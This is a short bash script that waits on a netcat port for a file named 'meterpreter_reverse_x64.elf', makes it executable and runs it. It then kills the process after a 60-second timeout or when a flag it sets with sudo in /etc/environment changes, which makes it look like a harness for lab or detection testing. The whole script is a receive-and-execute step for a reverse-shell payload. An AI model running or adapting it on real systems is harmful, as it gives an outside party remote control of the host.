#!/bin/bash

# Variables
SAVE_DIR="$HOME/Documents"
FILE_NAME="meterpreter_reverse_x64.elf"
RECEIVER_PORT="1234"  # Port to listen on

# Set COMPLETE to 0
sudo sed -i 's/^COMPLETE=.*/COMPLETE=0/' /etc/environment

# Create the save directory if it doesn't exist
mkdir -p "$SAVE_DIR"

# Receive the file using netcat
echo "Listening for the file on port $RECEIVER_PORT..."
nc -l -p "$RECEIVER_PORT" > "$SAVE_DIR/$FILE_NAME"

if [ $? -eq 0 ]; then
    echo "File received successfully and saved to $SAVE_DIR/$FILE_NAME."
else
    echo "Failed to receive file."
    exit 1
fi

# Make the received file executable
chmod +x "$SAVE_DIR/$FILE_NAME"

# Execute the received file
"$SAVE_DIR/$FILE_NAME" &

# Get the process ID of the executed file
PID=$!

# Start the timer
START_TIME=$(date +%s)

# Wait for COMPLETE to change from 0 or for the process to run more than 60 seconds
while [ "$(grep -oP '^COMPLETE=\K.*' /etc/environment)" = "0" ]; do
    CURRENT_TIME=$(date +%s)
    ELAPSED_TIME=$((CURRENT_TIME - START_TIME))

    if [ $ELAPSED_TIME -gt 60 ]; then
        echo "Process exceeded 60 seconds. Exiting with status 1."
        sudo pkill -f "$SAVE_DIR/$FILE_NAME"  # Kill the process if it's still running
        exit 1
    fi
    sleep 1
done

# Kill the process once COMPLETE changes
sudo pkill -f "$SAVE_DIR/$FILE_NAME"

exit 0
